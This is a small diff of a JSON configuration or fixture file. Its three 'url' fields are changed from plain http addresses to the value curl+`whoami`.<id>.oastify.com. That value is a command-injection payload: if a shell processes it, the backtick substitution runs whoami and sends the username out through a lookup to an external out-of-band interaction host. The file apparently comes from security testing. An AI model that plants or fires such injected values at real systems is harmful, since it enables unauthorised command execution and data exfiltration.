@@ -1,10 +1,10 @@
 {
-    "url": "http://277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
+    "url": "curl+`whoami`.277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
     "urls": [{
-        "url": "http://277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
+        "url": "curl+`whoami`.277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
         "name": "Foo"
     },{
-        "url": "http://277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
+        "url": "curl+`whoami`.277pezrcig80n60u5kerndo4fvlm9dx2.oastify.com",
         "name": "Foo2"
     }]
 }
